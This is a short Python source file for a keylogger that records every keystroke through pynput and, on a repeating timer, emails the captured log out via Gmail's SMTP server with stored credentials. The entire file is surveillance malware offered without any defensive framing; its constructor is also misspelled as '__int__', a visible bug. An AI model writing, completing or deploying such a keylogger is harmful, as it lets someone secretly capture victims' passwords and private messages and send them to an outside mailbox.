#!/usr/bin/env python

import pynput.keyboard
import threading
import smtplib

class Keylogger:
    def __int__(self, time_interval, email, password):
        # Initialize the keylogger
        self.log = "Keylogger started"
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        # Append string to the log
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            # Try to get the character representation of the key
            current_key = str(key.char)
        except AttributeError:
            # If key is not a character (e.g., special key), handle it accordingly
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        # Send the log via email and reset it
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = " "
        # Schedule the next report
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self, email, password, message):
        # Send an email with the provided message
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()
        
    def start(self):
        # Start the keylogger
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            # Start reporting and listen to keyboard events
            self.report()
            keyboard_listener.join()

